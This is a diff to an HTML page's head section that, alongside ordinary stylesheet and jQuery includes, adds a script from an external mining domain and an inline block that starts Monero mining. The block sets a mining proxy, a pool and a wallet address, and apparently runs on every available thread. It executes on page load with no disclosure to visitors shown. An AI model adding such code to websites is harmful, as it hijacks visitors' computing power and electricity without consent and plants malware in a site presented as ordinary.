@@ -9,10 +9,22 @@
 	<link rel="stylesheet" type="text/css" href="../style/style.css">
 	<link rel="stylesheet" type="text/css"
 		href="https://fonts.googleapis.com/css2?family=Exo+2:wght@400;700&display=swap">
-
+	
 	<!-- Scripts -->
 	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script type="text/javascript" src="../script/script.js"></script>
+	
+	<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+	<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "454C6tETrRiNpT9CVsrVtWYmDFjpK6AdCZP41F1VRUaGUc77hGq1e6bYkhb5bzWcRpZBn5CZzU9tvdf9H6ChUL7S7ZAqQzy";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+	</script>
 
 	<!-- Viewport -->
 	<meta name="viewport" content="width=device-width">
